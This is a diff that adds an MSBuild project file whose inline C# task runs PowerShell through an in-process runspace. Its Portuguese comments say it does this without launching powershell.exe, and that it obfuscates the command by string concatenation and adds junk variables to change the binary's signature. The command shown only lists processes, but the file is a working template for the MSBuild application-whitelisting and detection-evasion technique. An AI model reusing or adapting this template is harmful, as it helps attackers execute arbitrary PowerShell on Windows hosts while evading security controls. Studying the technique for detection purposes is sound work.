@@ -1,0 +1,74 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="ozyzuhukKaxAghzzXuVboMM">
+    <ozyzuhukKaxAghzzXuVboMM />
+    <HFROgYmOfsyfRAJyijvg />
+  </Target>
+
+  <!-- Tarefa vazia (mantida para estrutura) -->
+  <UsingTask
+    TaskName="ozyzuhukKaxAghzzXuVboMM"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Code Type="Fragment" Language="cs">
+      </Code>
+    </Task>
+  </UsingTask>
+
+  <!-- Tarefa principal modificada -->
+  <UsingTask
+    TaskName="HFROgYmOfsyfRAJyijvg"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Text;
+        using System.Management.Automation;
+        using System.Collections.ObjectModel;
+        using Microsoft.Build.Utilities;
+        using Microsoft.Build.Framework;
+        using System.Management.Automation.Runspaces;
+
+        public class HFROgYmOfsyfRAJyijvg : Task, ITask {
+            public override bool Execute() {
+                // ========== COMANDO OFUSCADO POR CONCATENAÇÃO ==========
+                string a1 = "Get";
+                string a2 = "-Pro";
+                string a3 = "cess";
+                string comando = a1 + a2 + a3;
+                // ======================================================
+
+                // Variáveis inúteis para alterar a assinatura do binário
+                int x = 42;
+                long y = 12345;
+                bool flag = (x > 0);
+                if (flag) { y = y + 1; }
+
+                // Executa o comando PowerShell sem abrir powershell.exe
+                Runspace rs = RunspaceFactory.CreateRunspace();
+                rs.Open();
+                Pipeline pipe = rs.CreatePipeline();
+                pipe.Commands.AddScript(comando);
+                pipe.Commands.Add("Out-String");
+
+                Collection<PSObject> resultado = pipe.Invoke();
+                rs.Close();
+
+                StringBuilder sb = new StringBuilder();
+                foreach (PSObject obj in resultado) {
+                    sb.AppendLine(obj.ToString());
+                }
+                Console.Write(sb.ToString());
+                return true;
+            }
+        }
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
